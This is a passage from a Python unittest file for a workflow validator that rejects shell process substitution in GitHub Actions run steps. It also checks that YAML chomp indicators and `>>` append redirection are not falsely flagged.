            + "          read A B C\n"
            + '          echo "$A $B $C"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class ProcessSubstitutionTests(unittest.TestCase):
    """Final focused-review closure: `<(...)` and `>(...)` (shell
    process substitution) execute their body as a command exactly like
    `$(...)` or a backtick substitution does, so the same
    variable/fragment-assembly bypass would apply equally there. This
    real workflow has no legitimate use for either spelling, so both are
    conservatively rejected outright wherever they appear (fail-closed),
    rather than duplicating a third parallel command-position tracker
    for a construct the real workflow never needs."""

    def test_input_process_substitution_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: diff <(cmd1) <(cmd2)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("process substitution" in v for v in violations), violations)

    def test_output_process_substitution_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: cmd1 > >(cmd2)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("process substitution" in v for v in violations), violations)

    def test_input_process_substitution_in_block_scalar_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          diff <(cmd1 --flag) <(cmd2 --flag)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("process substitution" in v for v in violations), violations)

    # --- negative controls ---

    def test_block_scalar_chomp_indicator_not_falsely_rejected(self):
        """The YAML folded-block-scalar chomp indicator (`run: >-`,
        followed by a newline, never a `(`) must never be mistaken for
        output process substitution."""
        text = GOOD_WORKFLOW + "      - run: >-\n          make release-check\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_append_redirection_not_falsely_rejected(self):
        """Ordinary `>>` append redirection (this repository's own real
        `>> "$GITHUB_STEP_SUMMARY"` idiom), with no `(` immediately
        after either `>`, must never be mistaken for process
        substitution."""
        text = (
            GOOD_WORKFLOW
            + '      - run: python3 -m scripts.release_rehearsal.cli summary >> "$GITHUB_STEP_SUMMARY"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


if __name__ == "__main__":
    unittest.main()
